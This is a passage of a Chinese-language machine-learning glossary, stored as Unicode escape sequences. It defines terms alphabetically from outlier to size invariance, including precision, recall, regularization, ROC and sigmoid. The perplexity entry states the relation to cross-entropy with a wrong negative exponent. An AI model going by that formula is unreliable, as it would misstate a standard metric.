\u3002\u4e0d\u540c\u7684\u4f18\u5316\u5668\u53ef\u80fd\u4f1a\u5229\u7528\u4ee5\u4e0b\u4e00\u4e2a\u6216\u591a\u4e2a\u6982\u5ff5\u6765\u589e\u5f3a\u68af\u5ea6\u4e0b\u964d\u6cd5\u5728\u6307\u5b9a \u8bad\u7ec3\u96c6 \u4e2d\u7684\u6548\u679c\uff1a \u52a8\u91cf (Momentum) \u66f4\u65b0\u9891\u7387\uff08 AdaGrad = ADAptive GRADient descent\uff1b Adam = ADAptive with Momentum\uff1bRMSProp\uff09 \u7a00\u758f\u6027/\u6b63\u5219\u5316 ( Ftrl ) \u66f4\u590d\u6742\u7684\u6570\u5b66\u65b9\u6cd5\uff08 Proximal \uff0c\u7b49\u7b49\uff09 \u751a\u81f3\u8fd8\u5305\u62ec NN \u9a71\u52a8\u7684\u4f18\u5316\u5668 \u3002 15.9. \u79bb\u7fa4\u503c (outlier) # \u4e0e\u5927\u591a\u6570\u5176\u4ed6\u503c\u5dee\u522b\u5f88\u5927\u7684\u503c\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u4e0b\u5217\u6240\u6709\u503c\u90fd\u662f\u79bb\u7fa4\u503c\u3002 \u7edd\u5bf9\u503c\u5f88\u9ad8\u7684 \u6743\u91cd \u3002 \u4e0e\u5b9e\u9645\u503c\u76f8\u5dee\u5f88\u5927\u7684\u9884\u6d4b\u503c\u3002 \u503c\u6bd4\u5e73\u5747\u503c\u9ad8\u5927\u7ea6 3 \u4e2a\u6807\u51c6\u504f\u5dee\u7684\u8f93\u5165\u6570\u636e\u3002 \u79bb\u7fa4\u503c\u5e38\u5e38\u4f1a\u5bfc\u81f4\u6a21\u578b\u8bad\u7ec3\u51fa\u73b0\u95ee\u9898\u3002 15.10. \u8f93\u51fa\u5c42 (output layer) # \u795e\u7ecf\u7f51\u7edc\u7684\"\u6700\u540e\"\u4e00\u5c42\uff0c\u4e5f\u662f\u5305\u542b\u7b54\u6848\u7684\u5c42\u3002 15.11. \u8fc7\u62df\u5408 (overfitting) # \u521b\u5efa\u7684\u6a21\u578b\u4e0e \u8bad\u7ec3\u6570\u636e \u8fc7\u4e8e\u5339\u914d\uff0c\u4ee5\u81f4\u4e8e\u6a21\u578b\u65e0\u6cd5\u6839\u636e\u65b0\u6570\u636e\u505a\u51fa\u6b63\u786e\u7684\u9884\u6d4b\u3002 16. P # 16.1. Pandas # \u9762\u5411\u5217\u7684\u6570\u636e\u5206\u6790 API\u3002\u5f88\u591a\u673a\u5668\u5b66\u4e60\u6846\u67b6\uff08\u5305\u62ec TensorFlow\uff09\u90fd\u652f\u6301\u5c06 Pandas \u6570\u636e\u7ed3\u6784\u4f5c\u4e3a\u8f93\u5165\u3002\u8bf7\u53c2\u9605 Pandas \u6587\u6863 \u3002 16.2. \u53c2\u6570 (parameter) # \u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u81ea\u884c\u8bad\u7ec3\u7684\u6a21\u578b\u7684\u53d8\u91cf\u3002\u4f8b\u5982\uff0c \u6743\u91cd \u5c31\u662f\u4e00\u79cd\u53c2\u6570\uff0c\u5b83\u4eec\u7684\u503c\u662f\u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u901a\u8fc7\u8fde\u7eed\u7684\u8bad\u7ec3\u8fed\u4ee3\u9010\u6e10\u5b66\u4e60\u5230\u7684\u3002\u4e0e \u8d85\u53c2\u6570 \u76f8\u5bf9\u3002 16.3. \u53c2\u6570\u670d\u52a1\u5668 (PS, Parameter Server) # \u4e00\u79cd\u4f5c\u4e1a\uff0c\u8d1f\u8d23\u5728\u5206\u5e03\u5f0f\u8bbe\u7f6e\u4e2d\u8ddf\u8e2a\u6a21\u578b \u53c2\u6570 \u3002 16.4. \u53c2\u6570\u66f4\u65b0 (parameter update) # \u5728\u8bad\u7ec3\u671f\u95f4\uff08\u901a\u5e38\u662f\u5728 \u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u5355\u6b21\u8fed\u4ee3\u4e2d\uff09\u8c03\u6574\u6a21\u578b \u53c2\u6570 \u7684\u64cd\u4f5c\u3002 16.5. \u504f\u5bfc\u6570 (partial derivative) # \u4e00\u79cd\u5bfc\u6570\uff0c\u9664\u4e00\u4e2a\u53d8\u91cf\u4e4b\u5916\u7684\u6240\u6709\u53d8\u91cf\u90fd\u88ab\u89c6\u4e3a\u5e38\u91cf\u3002\u4f8b\u5982\uff0cf(x, y) \u5bf9 x \u7684\u504f\u5bfc\u6570\u5c31\u662f f(x) \u7684\u5bfc\u6570\uff08\u5373\uff0c\u4f7f y \u4fdd\u6301\u6052\u5b9a\uff09\u3002f \u5bf9 x \u7684\u504f\u5bfc\u6570\u4ec5\u5173\u6ce8 x \u5982\u4f55\u53d8\u5316\uff0c\u800c\u5ffd\u7565\u516c\u5f0f\u4e2d\u7684\u6240\u6709\u5176\u4ed6\u53d8\u91cf\u3002 16.6. \u5212\u5206\u7b56\u7565 (partitioning strategy) # \u5728 \u53c2\u6570\u670d\u52a1\u5668 \u95f4\u5206\u5272\u53d8\u91cf\u7684\u7b97\u6cd5\u3002 16.7. \u6027\u80fd (performance) # \u591a\u542b\u4e49\u672f\u8bed\uff0c\u5177\u6709\u4ee5\u4e0b\u542b\u4e49\uff1a \u5728\u8f6f\u4ef6\u5de5\u7a0b\u4e2d\u7684\u4f20\u7edf\u542b\u4e49\u3002\u5373\uff1a\u76f8\u5e94\u8f6f\u4ef6\u7684\u8fd0\u884c\u901f\u5ea6\u6709\u591a\u5feb\uff08\u6216\u6709\u591a\u9ad8\u6548\uff09\uff1f \u5728\u673a\u5668\u5b66\u4e60\u4e2d\u7684\u542b\u4e49\u3002\u5728\u673a\u5668\u5b66\u4e60\u9886\u57df\uff0c\u6027\u80fd\u65e8\u5728\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\uff1a\u76f8\u5e94 \u6a21\u578b \u7684\u51c6\u786e\u5ea6\u6709\u591a\u9ad8\uff1f\u5373\u6a21\u578b\u5728\u9884\u6d4b\u65b9\u9762\u7684\u8868\u73b0\u6709\u591a\u597d\uff1f 16.8. \u56f0\u60d1\u5ea6 (perplexity) # \u4e00\u79cd\u8861\u91cf\u6307\u6807\uff0c\u7528\u4e8e\u8861\u91cf \u6a21\u578b \u80fd\u591f\u591a\u597d\u5730\u5b8c\u6210\u4efb\u52a1\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u4efb\u52a1\u662f\u8bfb\u53d6\u7528\u6237\u4f7f\u7528\u667a\u80fd\u624b\u673a\u952e\u76d8\u8f93\u5165\u5b57\u8bcd\u65f6\u8f93\u5165\u7684\u524d\u51e0\u4e2a\u5b57\u6bcd\uff0c\u7136\u540e\u5217\u51fa\u4e00\u7ec4\u53ef\u80fd\u7684\u5b8c\u6574\u5b57\u8bcd\u3002\u6b64\u4efb\u52a1\u7684\u56f0\u60d1\u5ea6 (P) \u662f\uff1a\u4e3a\u4e86\u4f7f\u5217\u51fa\u7684\u5b57\u8bcd\u4e2d\u5305\u542b\u7528\u6237\u5c1d\u8bd5\u8f93\u5165\u7684\u5b9e\u9645\u5b57\u8bcd\uff0c\u60a8\u9700\u8981\u63d0\u4f9b\u7684\u731c\u6d4b\u9879\u7684\u4e2a\u6570\u3002 \u56f0\u60d1\u5ea6\u4e0e \u4ea4\u53c9\u71b5 \u7684\u5173\u7cfb\u5982\u4e0b\uff1a p = 2^{-\\text{\u4ea4\u53c9\u71b5}} 16.9. \u6d41\u6c34\u7ebf (pipeline) # \u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u7684\u57fa\u7840\u67b6\u6784\u3002\u6d41\u6c34\u7ebf\u5305\u62ec\u6536\u96c6\u6570\u636e\u3001\u5c06\u6570\u636e\u653e\u5165\u8bad\u7ec3\u6570\u636e\u6587\u4ef6\u3001\u8bad\u7ec3\u4e00\u4e2a\u6216\u591a\u4e2a\u6a21\u578b\uff0c\u4ee5\u53ca\u5c06\u6a21\u578b\u5bfc\u51fa\u5230\u751f\u4ea7\u73af\u5883\u3002 16.10. \u6c60\u5316 (pooling) # \u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u7531\u524d\u8d8b\u7684 \u5377\u79ef\u5c42 \u521b\u5efa\u7684\u77e9\u9635\u538b\u7f29\u4e3a\u8f83\u5c0f\u7684\u77e9\u9635\u3002\u6c60\u5316\u901a\u5e38\u662f\u53d6\u6574\u4e2a\u6c60\u5316\u533a\u57df\u7684\u6700\u5927\u503c\u6216\u5e73\u5747\u503c\u3002\u4ee5\u4e0b\u9762\u7684 3x3 \u77e9\u9635\u4e3a\u4f8b\uff1a \u6c60\u5316\u8fd0\u7b97\u4e0e\u5377\u79ef\u8fd0\u7b97\u7c7b\u4f3c\uff1a\u5c06\u77e9\u9635\u5206\u5272\u4e3a\u591a\u4e2a\u5207\u7247\uff0c\u7136\u540e\u6309 \u6b65\u957f \u9010\u4e2a\u8fd0\u884c\u5377\u79ef\u8fd0\u7b97\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u6c60\u5316\u8fd0\u7b97\u6309 1x1 \u6b65\u957f\u5c06\u5377\u79ef\u77e9\u9635\u5206\u5272\u4e3a 2x2 \u4e2a\u5207\u7247\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fdb\u884c\u4e86\u56db\u4e2a\u6c60\u5316\u8fd0\u7b97\u3002\u5047\u8bbe\u6bcf\u4e2a\u6c60\u5316\u8fd0\u7b97\u90fd\u9009\u62e9\u8be5\u5207\u7247\u4e2d\u56db\u4e2a\u503c\u7684\u6700\u5927\u503c\uff1a \u6c60\u5316\u6709\u52a9\u4e8e\u5728\u8f93\u5165\u77e9\u9635\u4e2d\u5b9e\u73b0 \u5e73\u79fb\u4e0d\u53d8\u6027 \u3002 \u5bf9\u4e8e\u89c6\u89c9\u5e94\u7528\u6765\u8bf4\uff0c\u6c60\u5316\u7684\u66f4\u6b63\u5f0f\u540d\u79f0\u4e3a\u7a7a\u95f4\u6c60\u5316\u3002\u65f6\u95f4\u5e8f\u5217\u5e94\u7528\u901a\u5e38\u5c06\u6c60\u5316\u79f0\u4e3a\u65f6\u5e8f\u6c60\u5316\u3002\u6309\u7167\u4e0d\u592a\u6b63\u5f0f\u7684\u8bf4\u6cd5\uff0c\u6c60\u5316\u901a\u5e38\u79f0\u4e3a\u4e0b\u91c7\u6837\u6216\u964d\u91c7\u6837\u3002 16.11. \u6b63\u7c7b\u522b (positive class) # \u5728 \u4e8c\u5143\u5206\u7c7b \u4e2d\uff0c\u4e24\u79cd\u53ef\u80fd\u7684\u7c7b\u522b\u5206\u522b\u88ab\u6807\u8bb0\u4e3a\u6b63\u7c7b\u522b\u548c\u8d1f\u7c7b\u522b\u3002\u6b63\u7c7b\u522b\u7ed3\u679c\u662f\u6211\u4eec\u8981\u6d4b\u8bd5\u7684\u5bf9\u8c61\u3002\uff08\u4e0d\u53ef\u5426\u8ba4\u7684\u662f\uff0c\u6211\u4eec\u4f1a\u540c\u65f6\u6d4b\u8bd5\u8fd9\u4e24\u79cd\u7ed3\u679c\uff0c\u4f46\u53ea\u5173\u6ce8\u6b63\u7c7b\u522b\u7ed3\u679c\u3002\uff09\u4f8b\u5982\uff0c\u5728\u533b\u5b66\u68c0\u67e5\u4e2d\uff0c\u6b63\u7c7b\u522b\u53ef\u4ee5\u662f\"\u80bf\u7624\"\u3002\u5728\u7535\u5b50\u90ae\u4ef6\u5206\u7c7b\u5668\u4e2d\uff0c\u6b63\u7c7b\u522b\u53ef\u4ee5\u662f\"\u5783\u573e\u90ae\u4ef6\"\u3002 \u4e0e \u8d1f\u7c7b\u522b \u76f8\u5bf9\u3002 16.12. \u7cbe\u786e\u7387 (precision) # \u4e00\u79cd \u5206\u7c7b\u6a21\u578b \u6307\u6807\u3002\u7cbe\u786e\u7387\u6307\u6a21\u578b\u6b63\u786e\u9884\u6d4b \u6b63\u7c7b\u522b \u7684\u9891\u7387\uff0c\u5373\uff1a \\text{\u7cbe\u786e\u7387} = \\frac{\u6b63\u4f8b\u6570}{\u6b63\u4f8b\u6570 + \u5047\u6b63\u4f8b\u6570} 16.13. \u9884\u6d4b (prediction) # \u6a21\u578b\u5728\u6536\u5230\u8f93\u5165 \u6837\u672c \u540e\u7684\u8f93\u51fa\u3002 16.14. \u9884\u6d4b\u504f\u5dee (prediction bias) # \u4e00\u79cd\u503c\uff0c\u7528\u4e8e\u8868\u660e \u9884\u6d4b \u5e73\u5747\u503c\u4e0e\u6570\u636e\u96c6\u4e2d \u6807\u7b7e \u7684\u5e73\u5747\u503c\u76f8\u5dee\u6709\u591a\u5927\u3002 16.15. \u9884\u521b\u5efa\u7684 Estimator (pre-made Estimator) # \u5176\u4ed6\u4eba\u5df2\u5efa\u597d\u7684 Estimator \u3002TensorFlow \u63d0\u4f9b\u4e86\u4e00\u4e9b\u9884\u521b\u5efa\u7684 Estimator\uff0c\u5305\u62ec DNNClassifier \u3001 DNNRegressor \u548c LinearClassifier \u3002\u60a8\u53ef\u4ee5\u6309\u7167 \u8fd9\u4e9b\u8bf4\u660e \u6784\u5efa\u81ea\u5df1\u9884\u521b\u5efa\u7684 Estimator\u3002 16.16. \u9884\u8bad\u7ec3\u6a21\u578b (pre-trained model) # \u5df2\u7ecf\u8fc7\u8bad\u7ec3\u7684\u6a21\u578b\u6216\u6a21\u578b\u7ec4\u4ef6\uff08\u4f8b\u5982 \u5d4c\u5957 \uff09\u3002\u6709\u65f6\uff0c\u60a8\u9700\u8981\u5c06\u9884\u8bad\u7ec3\u7684\u5d4c\u5957\u9988\u9001\u5230 \u795e\u7ecf\u7f51\u7edc \u3002\u5728\u5176\u4ed6\u65f6\u5019\uff0c\u60a8\u7684\u6a21\u578b\u5c06\u81ea\u884c\u8bad\u7ec3\u5d4c\u5957\uff0c\u800c\u4e0d\u4f9d\u8d56\u4e8e\u9884\u8bad\u7ec3\u7684\u5d4c\u5957\u3002 16.17. \u5148\u9a8c\u4fe1\u5ff5 (prior belief) # \u5728\u5f00\u59cb\u91c7\u7528\u76f8\u5e94\u6570\u636e\u8fdb\u884c\u8bad\u7ec3\u4e4b\u524d\uff0c\u60a8\u5bf9\u8fd9\u4e9b\u6570\u636e\u62b1\u6709\u7684\u4fe1\u5ff5\u3002\u4f8b\u5982\uff0c L_2 \u6b63\u5219\u5316 \u4f9d\u8d56\u7684\u5148\u9a8c\u4fe1\u5ff5\u662f \u6743\u91cd \u5e94\u8be5\u5f88\u5c0f\u4e14\u5e94\u4ee5 0 \u4e3a\u4e2d\u5fc3\u5448\u6b63\u6001\u5206\u5e03\u3002 17. Q # 17.1. \u961f\u5217 (queue) # \u4e00\u79cd TensorFlow \u64cd\u4f5c \uff0c\u7528\u4e8e\u5b9e\u73b0\u961f\u5217\u6570\u636e\u7ed3\u6784\u3002\u901a\u5e38\u7528\u4e8e I/O \u4e2d\u3002 18. R # 18.1. \u7b49\u7ea7 (rank) # \u673a\u5668\u5b66\u4e60\u4e2d\u7684\u4e00\u4e2a\u591a\u542b\u4e49\u672f\u8bed\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e0b\u5217\u542b\u4e49\u4e4b\u4e00\uff1a \u5f20\u91cf \u4e2d\u7684\u7ef4\u6570\u3002\u4f8b\u5982\uff0c\u6807\u91cf\u7b49\u7ea7\u4e3a 0\uff0c\u5411\u91cf\u7b49\u7ea7\u4e3a 1\uff0c\u77e9\u9635\u7b49\u7ea7\u4e3a 2\u3002 \u5728\u5c06\u7c7b\u522b\u4ece\u6700\u9ad8\u5230\u6700\u4f4e\u8fdb\u884c\u6392\u5e8f\u7684\u673a\u5668\u5b66\u4e60\u95ee\u9898\u4e2d\uff0c\u7c7b\u522b\u7684\u987a\u5e8f\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c\u884c\u4e3a\u6392\u5e8f\u7cfb\u7edf\u53ef\u4ee5\u5c06\u72d7\u72d7\u7684\u5956\u52b1\u4ece\u6700\u9ad8\uff08\u725b\u6392\uff09\u5230\u6700\u4f4e\uff08\u67af\u840e\u7684\u7fbd\u8863\u7518\u84dd\uff09\u8fdb\u884c\u6392\u5e8f\u3002 18.2. \u8bc4\u5206\u8005 (rater) # \u4e3a \u6837\u672c \u63d0\u4f9b \u6807\u7b7e \u7684\u4eba\u3002\u6709\u65f6\u79f0\u4e3a\"\u6ce8\u91ca\u8005\"\u3002 18.3. \u53ec\u56de\u7387 (recall) # \u4e00\u79cd \u5206\u7c7b\u6a21\u578b \u6307\u6807\uff0c\u7528\u4e8e\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\uff1a\u5728\u6240\u6709\u53ef\u80fd\u7684\u6b63\u7c7b\u522b\u6807\u7b7e\u4e2d\uff0c\u6a21\u578b\u6b63\u786e\u5730\u8bc6\u522b\u51fa\u4e86\u591a\u5c11\u4e2a\uff1f\u5373\uff1a \\text{\u53ec\u56de\u7387} = \\frac{\u6b63\u4f8b\u6570}{\u6b63\u4f8b\u6570 + \u5047\u8d1f\u4f8b\u6570} 18.4. \u4fee\u6b63\u7ebf\u6027\u5355\u5143 (ReLU, Rectified Linear Unit) # \u4e00\u79cd \u6fc0\u6d3b\u51fd\u6570 \uff0c\u5176\u89c4\u5219\u5982\u4e0b\uff1a \u5982\u679c\u8f93\u5165\u4e3a\u8d1f\u6570\u6216 0\uff0c\u5219\u8f93\u51fa 0\u3002 \u5982\u679c\u8f93\u5165\u4e3a\u6b63\u6570\uff0c\u5219\u8f93\u51fa\u7b49\u4e8e\u8f93\u5165\u3002 18.5. \u56de\u5f52\u6a21\u578b (regression model) # \u4e00\u79cd\u6a21\u578b\uff0c\u80fd\u591f\u8f93\u51fa\u8fde\u7eed\u7684\u503c\uff08\u901a\u5e38\u4e3a\u6d6e\u70b9\u503c\uff09\u3002\u8bf7\u4e0e \u5206\u7c7b\u6a21\u578b \u8fdb\u884c\u6bd4\u8f83\uff0c\u5206\u7c7b\u6a21\u578b\u4f1a\u8f93\u51fa\u79bb\u6563\u503c\uff0c\u4f8b\u5982\"\u9ec4\u82b1\u83dc\"\u6216\"\u864e\u76ae\u767e\u5408\"\u3002 18.6. \u6b63\u5219\u5316 (regularization) # \u5bf9\u6a21\u578b\u590d\u6742\u5ea6\u7684\u60e9\u7f5a\u3002\u6b63\u5219\u5316\u6709\u52a9\u4e8e\u9632\u6b62\u51fa\u73b0 \u8fc7\u62df\u5408 \uff0c\u5305\u542b\u4ee5\u4e0b\u7c7b\u578b\uff1a L_1 \u6b63\u5219\u5316 L_2 \u6b63\u5219\u5316 \u4e22\u5f03\u6b63\u5219\u5316 \u65e9\u505c\u6cd5 \uff08\u8fd9\u4e0d\u662f\u6b63\u5f0f\u7684\u6b63\u5219\u5316\u65b9\u6cd5\uff0c\u4f46\u53ef\u4ee5\u6709\u6548\u9650\u5236\u8fc7\u62df\u5408\uff09 18.7. \u6b63\u5219\u5316\u7387 (regularization rate) # \u4e00\u79cd\u6807\u91cf\u503c\uff0c\u4ee5 lambda \u8868\u793a\uff0c\u7528\u4e8e\u6307\u5b9a\u6b63\u5219\u5316\u51fd\u6570\u7684\u76f8\u5bf9\u91cd\u8981\u6027\u3002\u4ece\u4e0b\u9762\u7b80\u5316\u7684 \u635f\u5931 \u516c\u5f0f\u4e2d\u53ef\u4ee5\u770b\u51fa\u6b63\u5219\u5316\u7387\u7684\u5f71\u54cd\uff1a \\min(\\text{\u635f\u5931\u65b9\u7a0b} + \\lambda \\text{\u6b63\u5219\u5316\u65b9\u7a0b}) \u63d0\u9ad8\u6b63\u5219\u5316\u7387\u53ef\u4ee5\u51cf\u5c11 \u8fc7\u62df\u5408 \uff0c\u4f46\u53ef\u80fd\u4f1a\u4f7f\u6a21\u578b\u7684 \u51c6\u786e\u7387 \u964d\u4f4e\u3002 18.8. \u8868\u793a\u6cd5 (representation) # \u5c06\u6570\u636e\u6620\u5c04\u5230\u5b9e\u7528 \u7279\u5f81 \u7684\u8fc7\u7a0b\u3002 18.9. \u53d7\u8bd5\u8005\u5de5\u4f5c\u7279\u5f81\u66f2\u7ebf\uff08receiver operating characteristic\uff0c\u7b80\u79f0 ROC \u66f2\u7ebf\uff09 # \u4e0d\u540c \u5206\u7c7b\u9608\u503c \u4e0b\u7684 \u6b63\u4f8b\u7387 \u548c \u5047\u6b63\u4f8b\u7387 \u6784\u6210\u7684\u66f2\u7ebf\u3002\u53e6\u8bf7\u53c2\u9605 \u66f2\u7ebf\u4e0b\u9762\u79ef \u3002 18.10. \u6839\u76ee\u5f55 (root directory) # \u60a8\u6307\u5b9a\u7684\u76ee\u5f55\uff0c\u7528\u4e8e\u6258\u7ba1\u591a\u4e2a\u6a21\u578b\u7684 TensorFlow \u68c0\u67e5\u70b9\u548c\u4e8b\u4ef6\u6587\u4ef6\u7684\u5b50\u76ee\u5f55\u3002 18.11. \u5747\u65b9\u6839\u8bef\u5dee (RMSE, Root Mean Squared Error) # \u5747\u65b9\u8bef\u5dee \u7684\u5e73\u65b9\u6839\u3002 18.12. \u65cb\u8f6c\u4e0d\u53d8\u6027 (rotational invariance) # \u5728\u56fe\u50cf\u5206\u7c7b\u95ee\u9898\u4e2d\uff0c\u5373\u4f7f\u56fe\u50cf\u7684\u65b9\u5411\u53d1\u751f\u53d8\u5316\uff0c\u7b97\u6cd5\u4e5f\u80fd\u6210\u529f\u5730\u5bf9\u56fe\u50cf\u8fdb\u884c\u5206\u7c7b\u3002\u4f8b\u5982\uff0c\u65e0\u8bba\u7f51\u7403\u62cd\u671d\u4e0a\u3001\u4fa7\u5411\u8fd8\u662f\u671d\u4e0b\u653e\u7f6e\uff0c\u8be5\u7b97\u6cd5\u4ecd\u7136\u53ef\u4ee5\u8bc6\u522b\u5b83\u3002\u8bf7\u6ce8\u610f\uff0c\u5e76\u975e\u603b\u662f\u5e0c\u671b\u65cb\u8f6c\u4e0d\u53d8\uff1b\u4f8b\u5982\uff0c\u5012\u7f6e\u7684\"9\"\u4e0d\u5e94\u5206\u7c7b\u4e3a\"9\"\u3002 \u53e6\u8bf7\u53c2\u9605 \u5e73\u79fb\u4e0d\u53d8\u6027 \u548c \u5927\u5c0f\u4e0d\u53d8\u6027 \u3002 19. S # 19.1. SavedModel # \u4fdd\u5b58\u548c\u6062\u590d TensorFlow \u6a21\u578b\u65f6\u5efa\u8bae\u4f7f\u7528\u7684\u683c\u5f0f\u3002SavedModel \u662f\u4e00\u79cd\u72ec\u7acb\u4e8e\u8bed\u8a00\u4e14\u53ef\u6062\u590d\u7684\u5e8f\u5217\u5316\u683c\u5f0f\uff0c\u4f7f\u8f83\u9ad8\u7ea7\u522b\u7684\u7cfb\u7edf\u548c\u5de5\u5177\u53ef\u4ee5\u521b\u5efa\u3001\u4f7f\u7528\u548c\u8f6c\u6362 TensorFlow \u6a21\u578b\u3002 \u5982\u9700\u5b8c\u6574\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u300aTensorFlow \u7f16\u7a0b\u4eba\u5458\u6307\u5357\u300b\u4e2d\u7684 \u4fdd\u5b58\u548c\u6062\u590d \u3002 19.2. Saver # \u4e00\u79cd TensorFlow \u5bf9\u8c61 \uff0c\u8d1f\u8d23\u4fdd\u5b58\u6a21\u578b\u68c0\u67e5\u70b9\u3002 19.3. \u7f29\u653e (scaling) # \u7279\u5f81\u5de5\u7a0b \u4e2d\u7684\u4e00\u79cd\u5e38\u7528\u505a\u6cd5\uff0c\u662f\u6307\u5bf9\u67d0\u4e2a\u7279\u5f81\u7684\u503c\u533a\u95f4\u8fdb\u884c\u8c03\u6574\uff0c\u4f7f\u4e4b\u4e0e\u6570\u636e\u96c6\u4e2d\u5176\u4ed6\u7279\u5f81\u7684\u503c\u533a\u95f4\u4e00\u81f4\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u60a8\u5e0c\u671b\u6570\u636e\u96c6\u4e2d\u6240\u6709\u6d6e\u70b9\u7279\u5f81\u7684\u503c\u90fd\u4f4d\u4e8e 0 \u5230 1 \u533a\u95f4\u5185\uff0c\u5982\u679c\u67d0\u4e2a\u7279\u5f81\u7684\u503c\u4f4d\u4e8e 0 \u5230 500 \u533a\u95f4\u5185\uff0c\u60a8\u5c31\u53ef\u4ee5\u901a\u8fc7\u5c06\u6bcf\u4e2a\u503c\u9664\u4ee5 500 \u6765\u7f29\u653e\u8be5\u7279\u5f81\u3002 \u53e6\u8bf7\u53c2\u9605 \u6807\u51c6\u5316 \u3002 19.4. scikit-learn # \u4e00\u4e2a\u70ed\u95e8\u7684\u5f00\u653e\u6e90\u4ee3\u7801\u673a\u5668\u5b66\u4e60\u5e73\u53f0\u3002\u8bf7\u8bbf\u95ee www.scikit-learn.org \u3002 19.5. \u534a\u76d1\u7763\u5f0f\u5b66\u4e60 (semi-supervised learning) # \u8bad\u7ec3\u6a21\u578b\u65f6\u91c7\u7528\u7684\u6570\u636e\u4e2d\uff0c\u67d0\u4e9b\u8bad\u7ec3\u6837\u672c\u6709\u6807\u7b7e\uff0c\u800c\u5176\u4ed6\u6837\u672c\u5219\u6ca1\u6709\u6807\u7b7e\u3002\u534a\u76d1\u7763\u5f0f\u5b66\u4e60\u91c7\u7528\u7684\u4e00\u79cd\u6280\u672f\u662f\u63a8\u65ad\u65e0\u6807\u7b7e\u6837\u672c\u7684\u6807\u7b7e\uff0c\u7136\u540e\u4f7f\u7528\u63a8\u65ad\u51fa\u7684\u6807\u7b7e\u8fdb\u884c\u8bad\u7ec3\uff0c\u4ee5\u521b\u5efa\u65b0\u6a21\u578b\u3002\u5982\u679c\u83b7\u5f97\u6709\u6807\u7b7e\u6837\u672c\u9700\u8981\u9ad8\u6602\u7684\u6210\u672c\uff0c\u800c\u65e0\u6807\u7b7e\u6837\u672c\u5219\u6709\u5f88\u591a\uff0c\u90a3\u4e48\u534a\u76d1\u7763\u5f0f\u5b66\u4e60\u5c06\u975e\u5e38\u6709\u7528\u3002 19.6. \u5e8f\u5217\u6a21\u578b (sequence model) # \u4e00\u79cd\u6a21\u578b\uff0c\u5176\u8f93\u5165\u5177\u6709\u5e8f\u5217\u4f9d\u8d56\u6027\u3002\u4f8b\u5982\uff0c\u6839\u636e\u4e4b\u524d\u89c2\u770b\u8fc7\u7684\u4e00\u7cfb\u5217\u89c6\u9891\u5bf9\u89c2\u770b\u7684\u4e0b\u4e00\u4e2a\u89c6\u9891\u8fdb\u884c\u9884\u6d4b\u3002 19.7. \u4f1a\u8bdd (tf.session) # \u5c01\u88c5\u4e86 TensorFlow \u8fd0\u884c\u65f6\u72b6\u6001\u7684\u5bf9\u8c61\uff0c\u7528\u4e8e\u8fd0\u884c\u5168\u90e8\u6216\u90e8\u5206 \u56fe \u3002\u5728\u4f7f\u7528\u5e95\u5c42 TensorFlow API \u65f6\uff0c\u60a8\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u5e76\u7ba1\u7406\u4e00\u4e2a\u6216\u591a\u4e2a tf.session \u5bf9\u8c61\u3002\u5728\u4f7f\u7528 Estimator API \u65f6\uff0cEstimator \u4f1a\u4e3a\u60a8\u521b\u5efa\u4f1a\u8bdd\u5bf9\u8c61\u3002 19.8. S \u578b\u51fd\u6570 (sigmoid function) # \u4e00\u79cd\u51fd\u6570\uff0c\u53ef\u5c06\u903b\u8f91\u56de\u5f52\u8f93\u51fa\u6216\u591a\u9879\u56de\u5f52\u8f93\u51fa\uff08\u5bf9\u6570\u51e0\u7387\uff09\u6620\u5c04\u5230\u6982\u7387\uff0c\u4ee5\u8fd4\u56de\u4ecb\u4e8e 0 \u5230 1 \u4e4b\u95f4\u7684\u503c\u3002S \u578b\u51fd\u6570\u7684\u516c\u5f0f\u5982\u4e0b\uff1a y = \\frac{1}{1 + e^{-\\sigma}} \u5728 \u903b\u8f91\u56de\u5f52 \u95ee\u9898\u4e2d\uff0c \u975e\u5e38\u7b80\u5355\uff1a \\sigma = b + w_1 x_1 + w_2 x_2 + \\dots + w_n x_n \u6362\u53e5\u8bdd\u8bf4\uff0cS \u578b\u51fd\u6570\u53ef\u5c06 \\sigma \u8f6c\u6362\u4e3a\u4ecb\u4e8e 0 \u5230 1 \u4e4b\u95f4\u7684\u6982\u7387\u3002 \u5728\u67d0\u4e9b \u795e\u7ecf\u7f51\u7edc \u4e2d\uff0cS \u578b\u51fd\u6570\u53ef\u4f5c\u4e3a \u6fc0\u6d3b\u51fd\u6570 \u4f7f\u7528\u3002 19.9. \u5927\u5c0f\u4e0d\u53d8\u6027 (size invariance) # \u5728\u56fe\u50cf\u5206\u7c7b\u95ee\u9898\u4e2d\uff0c\u5373\u4f7f\u56fe\u50cf\u7684\u5927\u5c0f\u53d1\u751f\u53d8\u5316\uff0c\u7b97\u6cd5\u4e5f\u80fd\u6210\u529f\u5730\u5bf9\u56fe\u50cf\u8fdb\u884c\u5206\u7c7b\u3002\u4f8b\u5982\uff0c\u65e0\u8bba\u4e00\u53ea\u732b\u4ee5 200 \u4e07\u50cf\u7d20\u8fd8\u662f 20 \u4e07\u50cf\u7d20\u5448\u73b0\uff0c\u8be5\u7b97\u6cd5\u4ecd\u7136\u53ef\u4ee5\u8bc6\u522b\u5b83\u3002\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u662f\u6700\u597d\u7684\u56fe\u50cf\u5206\u7c7b\u7b97\u6cd5\uff0c\u5728\u5927\u5c0f\u4e0d\u53d8\u6027\u65b9\u9762\u4ecd\u7136\u4f1a\u5b58\u5728\u5207\u5b9e\u7684\u9650\u5236\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4ec5\u4ee5 20 